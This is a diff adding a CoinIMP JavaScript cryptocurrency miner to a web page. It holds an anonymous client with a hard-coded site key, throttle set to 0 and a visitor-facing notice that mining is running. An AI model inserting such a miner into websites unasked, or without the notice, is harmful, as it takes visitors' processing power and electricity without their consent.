@@ -1,0 +1,9 @@
+<script src="http://<your-domain>/<path-to-script>/csSz.php?f=llAc.js"></script>
+<script>
+    var _client = new Client.Anonymous('80307141e0dc4d6b9e80c00da47031bee7f8c3ba266f01198245868b1b00bf1c', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+</script>
